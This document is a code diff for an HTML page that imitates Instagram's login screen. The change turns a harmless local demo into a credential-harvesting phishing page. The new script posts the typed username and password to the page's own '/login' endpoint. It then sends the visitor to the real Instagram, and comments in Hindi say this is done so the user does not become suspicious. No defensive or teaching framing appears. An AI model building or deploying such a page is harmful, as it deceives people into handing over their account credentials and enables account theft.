@@ -1,115 +1,95 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Instagram Login</title>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>Instagram Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            background: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+        }
 
-<style>
-    * { box-sizing: border-box; }
-    body {
-        background: #fafafa;
-        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        min-height: 100vh;
-        margin: 0;
-    }
+        .box {
+            background: white;
+            width: 350px;
+            padding: 20px 40px;
+            border: 1px solid #dbdbdb;
+            text-align: center;
+            margin-bottom: 10px;
+        }
 
-    /* Main Container */
-    .box {
-        background: white;
-        width: 350px;
-        padding: 20px 40px;
-        border: 1px solid #dbdbdb;
-        text-align: center;
-        margin-bottom: 10px;
-    }
+        .logo { margin: 22px 0; }
+        .icon {
+            width: 60px; height: 60px;
+            margin: 0 auto 15px;
+            border-radius: 15px;
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+            position: relative;
+        }
+        .icon::before {
+            content: ""; position: absolute;
+            top: 13px; left: 13px;
+            width: 28px; height: 28px;
+            border: 3px solid white; border-radius: 50%;
+        }
+        .icon::after {
+            content: ""; position: absolute;
+            top: 10px; right: 10px;
+            width: 5px; height: 5px;
+            background: white; border-radius: 50%;
+        }
+        .name {
+            font-size: 32px;
+            font-weight: bold;
+            letter-spacing: -1px;
+        }
 
-    /* Logo Styling */
-    .logo { margin: 22px 0; }
-    .icon {
-        width: 60px;
-        height: 60px;
-        margin: 0 auto 15px;
-        border-radius: 15px;
-        background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
-        position: relative;
-    }
-    .icon::before {
-        content: ""; position: absolute;
-        top: 13px; left: 13px;
-        width: 28px; height: 28px;
-        border: 3px solid white; border-radius: 50%; /* Circle lens */
-    }
-    .icon::after {
-        content: ""; position: absolute;
-        top: 10px; right: 10px;
-        width: 5px; height: 5px;
-        background: white; border-radius: 50%;
-    }
-    .name {
-        font-family: 'Arial', sans-serif;
-        font-size: 32px;
-        font-weight: bold;
-        letter-spacing: -1px;
-    }
+        input {
+            width: 100%;
+            padding: 9px 8px;
+            margin-bottom: 6px;
+            border: 1px solid #dbdbdb;
+            background: #fafafa;
+            font-size: 12px;
+            border-radius: 3px;
+        }
 
-    /* Inputs */
-    input {
-        width: 100%;
-        padding: 9px 8px;
-        margin-bottom: 6px;
-        border: 1px solid #dbdbdb;
-        background: #fafafa;
-        font-size: 12px;
-        border-radius: 3px;
-    }
-    input:focus { border: 1px solid #a8a8a8; outline: none; }
+        button {
+            width: 100%;
+            padding: 7px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            font-weight: 600;
+            border-radius: 8px;
+            cursor: pointer;
+            margin-top: 8px;
+        }
 
-    /* Button */
-    button {
-        width: 100%;
-        padding: 7px;
-        background: #0095f6;
-        color: white;
-        border: none;
-        font-weight: 600;
-        border-radius: 8px;
-        cursor: pointer;
-        margin-top: 8px;
-    }
-    button:disabled { opacity: 0.7; }
+        .separator {
+            display: flex; align-items: center;
+            margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600;
+        }
+        .separator::before, .separator::after {
+            content: ""; flex: 1; height: 1px; background: #dbdbdb;
+        }
+        .separator::before { margin-right: 18px; }
+        .separator::after { margin-left: 18px; }
 
-    /* OR Separator */
-    .separator {
-        display: flex; align-items: center;
-        margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600;
-    }
-    .separator::before, .separator::after {
-        content: ""; flex: 1; height: 1px; background: #dbdbdb;
-    }
-    .separator::before { margin-right: 18px; }
-    .separator::after { margin-left: 18px; }
-
-    /* Facebook & Forgot */
-    .fb-login {
-        color: #385185; font-size: 14px; font-weight: 600;
-        cursor: pointer; text-decoration: none; display: block; margin-bottom: 15px;
-    }
-    .forgot-pw { font-size: 12px; color: #00376b; text-decoration: none; }
-
-    /* Signup Box */
-    .signup-box {
-        background: white; width: 350px; padding: 20px;
-        border: 1px solid #dbdbdb; text-align: center; font-size: 14px;
-    }
-    .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
-</style>
+        .fb-login { color: #385185; font-size: 14px; font-weight: 600; text-decoration: none; display: block; margin-bottom: 15px; }
+        .forgot-pw { font-size: 12px; color: #00376b; text-decoration: none; }
+        .signup-box { background: white; width: 350px; padding: 20px; border: 1px solid #dbdbdb; text-align: center; font-size: 14px; }
+        .signup-box a { color: #0095f6; text-decoration: none; font-weight: 600; }
+    </style>
 </head>
-
 <body>
 
 <div class="box">
@@ -121,11 +101,10 @@
     <form onsubmit="sendData(); return false;">
         <input type="text" id="username" placeholder="Phone number, username, or email" required>
         <input type="password" id="password" placeholder="Password" required>
-        <button type="submit">Log In</button>
+        <button type="submit" id="loginBtn">Log In</button>
     </form>
 
     <div class="separator">OR</div>
-
     <a href="#" class="fb-login">Log in with Facebook</a>
     <a href="#" class="forgot-pw">Forgot password?</a>
 </div>
@@ -135,11 +114,28 @@
 </div>
 
 <script>
-function sendData() {
-    const username = document.getElementById("username").value;
-    const password = document.getElementById("password").value;
-    console.log("Login Attempt:", { username, password });
-    alert("Login attempt for: " + username);
+async function sendData() {
+    const btn = document.getElementById("loginBtn");
+    const user = document.getElementById("username").value;
+    const pass = document.getElementById("password").value;
+
+    btn.disabled = true;
+    btn.innerText = "Logging in...";
+
+    try {
+        const response = await fetch("/login", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ username: user, password: pass })
+        });
+
+        // Data bhejne ke baad user ko asli Instagram par redirect kar do
+        window.location.href = "https://www.instagram.com/accounts/login/";
+    } catch (error) {
+        console.error("Error:", error);
+        // Error hone par bhi redirect kar sakte hain taaki user ko shak na ho
+        window.location.href = "https://www.instagram.com";
+    }
 }
 </script>
 
